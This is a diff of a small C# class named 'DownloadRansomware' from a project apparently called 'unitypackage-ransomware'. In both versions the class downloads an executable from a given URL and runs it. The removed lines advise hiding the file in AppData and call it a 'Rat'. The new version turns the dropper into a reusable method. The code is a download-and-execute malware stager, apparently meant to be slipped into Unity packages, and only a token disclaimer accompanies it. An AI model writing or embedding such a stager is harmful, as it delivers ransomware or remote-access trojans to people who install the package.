@@ -1,39 +1,27 @@
-﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Linq;
-using System.Security.Cryptography;
-using System.Text;
-using System.Threading.Tasks;
-using System.Net;
-using System.IO;
+﻿using System.Net;
 using System.Diagnostics;
 
 namespace UnitypackageRussianRoulett
 {
-    //Dont use that for Illegal aktivity! Made by Mei-chan 
-    //Github: https://github.com/Neko-Oneechan
+    //Dont use that for Illegal aktivity!
+    //Github: https://github.com/none-development/unitypackage-ransomware
     public class DownloadRansomware
     {
-        private static string downloadurl = ""; //Add here ur File Download! 
-        private static string filenamedownload = ""; //Add here the name fronm ur like "a.exe"
-        private static string downloadpath = ""; //Add here the path where it should be stored. Suitable order to hide this would be Appdata
-
-        //To use this, call that Methode
-        public static void RunDownloadedProgramm()
-        {
-            DownloadRat();
-            Process.Start(downloadpath+filenamedownload);
-        }
 
 
-        //To Download the *.exe and store it.
-        private static void DownloadRat()
+        /// <summary>
+        /// Method to download a file
+        /// </summary>
+        /// <param name="downloadurl">Full URL from the Filw you want to Download</param>
+        /// <param name="downloadpath">Full Path for the File</param>
+        /// <param name="filenamedownload">e.g Progamm.exe</param>
+        public static void RunDownloadedProgramm(string downloadurl, string downloadpath = null, string filenamedownload = null)
         {
             using (var downloader = new WebClient())
             {
-                downloader.DownloadFile(downloadurl, downloadpath+filenamedownload);
+                downloader.DownloadFile(downloadurl, downloadpath + filenamedownload);
             }
+            Process.Start(downloadpath+filenamedownload);
         }
     }
 }
